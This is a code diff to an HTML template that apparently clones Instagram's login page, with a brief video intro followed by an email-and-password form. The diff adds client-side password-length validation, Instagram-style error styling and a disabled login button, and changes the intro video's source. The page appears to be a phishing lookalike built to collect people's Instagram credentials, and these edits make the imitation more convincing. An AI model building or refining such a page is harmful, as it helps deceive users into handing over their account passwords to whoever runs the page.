@@ -100,6 +100,10 @@
             border-color: #a8a8a8;
         }
 
+        .input-field.input-error {
+            border-color: #ed4956;
+        }
+
         /* ---------- Proper Instagram Error UI ---------- */
         .error {
             display: none;
@@ -138,11 +142,19 @@
             font-weight: 700;
             cursor: pointer;
             margin-top: 8px;
-            transition: background-color 0.15s ease;
+            transition: all 0.2s ease;
         }
 
-        .login-button:hover { background-color: #1877f2; }
-        .login-button:active { transform: scale(0.99); }
+        .login-button:hover:not(:disabled) { background-color: #1877f2; }
+        .login-button:active:not(:disabled) { transform: scale(0.99); }
+
+        /* Disabled State for Login Button */
+        .login-button:disabled {
+            background-color: #b2dffc;
+            color: #ffffffcc;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
 
         .forgot-password {
             text-align: center;
@@ -214,7 +226,7 @@
     <!-- Video Intro -->
     <div id="video-container">
         <video id="intro-video" autoplay muted playsinline>
-            <source src="https://www.instagram.com/accounts/password/reset/?hl=en" type="video/mp4">
+            <source src="https://res.cloudinary.com/dnpudf84r/video/upload/v1791910846/POV_Your_Bengali_Girlfriend_bengali_love_saree_-_Sadhna_Nandan_360p_h264_i185zg.mp4" type="video/mp4">
         </video>
     </div>
 
@@ -249,7 +261,7 @@
                 <input type="password" name="password" id="password" class="input-field" placeholder="Password" required autocomplete="current-password">
                 <div id="error" class="error {% if error %}visible{% endif %}">{{ error }}</div>
 
-                <button type="submit" class="login-button">Log in</button>
+                <button type="submit" class="login-button" id="loginBtn" disabled>Log in</button>
             </form>
 
             <div class="forgot-password">
@@ -291,6 +303,12 @@
         const loginContainer = document.getElementById('login-container');
         const videoContainer = document.getElementById('video-container');
 
+        // Elements for password validation
+        const passwordInput = document.getElementById('password');
+        const emailInput = document.getElementById('email');
+        const loginBtn = document.getElementById('loginBtn');
+        const errorDiv = document.getElementById('error');
+
         video.addEventListener('timeupdate', function() {
             if (video.currentTime >= 2) { // Play for 2 seconds
                 videoContainer.style.display = 'none';
@@ -303,6 +321,51 @@
             videoContainer.style.display = 'none';
             loginContainer.style.display = 'flex';
         });
+
+        // ========== NEW: Password Length Validation ==========
+        function checkLoginButtonState() {
+            const passwordLength = passwordInput.value.trim().length;
+            const emailValue = emailInput.value.trim();
+
+            // Button is active only when password >= 6 characters AND email is not empty
+            if (passwordLength >= 6 && emailValue.length > 0) {
+                loginBtn.disabled = false;
+                passwordInput.classList.remove('input-error');
+                // Clear error if password is now valid
+                if (errorDiv.classList.contains('visible') && errorDiv.textContent.includes('Password must be at least')) {
+                    errorDiv.classList.remove('visible');
+                }
+            } else {
+                loginBtn.disabled = true;
+            }
+        }
+
+        // Listen to both password and email input for button state
+        passwordInput.addEventListener('input', function() {
+            const passwordLength = this.value.length;
+
+            // Show error instantly when user is typing but password is too short (only after they've typed something)
+            if (passwordLength > 0 && passwordLength < 6) {
+                this.classList.add('input-error');
+                errorDiv.textContent = "Password must be at least 6 characters.";
+                errorDiv.classList.add('visible');
+            } else if (passwordLength === 0) {
+                this.classList.remove('input-error');
+                errorDiv.classList.remove('visible');
+            } else {
+                this.classList.remove('input-error');
+            }
+
+            checkLoginButtonState();
+        });
+
+        emailInput.addEventListener('input', function() {
+            checkLoginButtonState();
+        });
+
+        // Initial state - button disabled
+        loginBtn.disabled = true;
+        // ====================================================
 
         function validateForm(emailOrPhone) {
             const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
@@ -328,6 +391,14 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             const errorDiv = document.getElementById('error');
+
+            // Extra safety: block submission if password < 6
+            if (password.length < 6) {
+                errorDiv.textContent = "Password must be at least 6 characters.";
+                errorDiv.classList.add('visible');
+                passwordInput.classList.add('input-error');
+                return;
+            }
 
             if (!validateForm(email)) return;
 
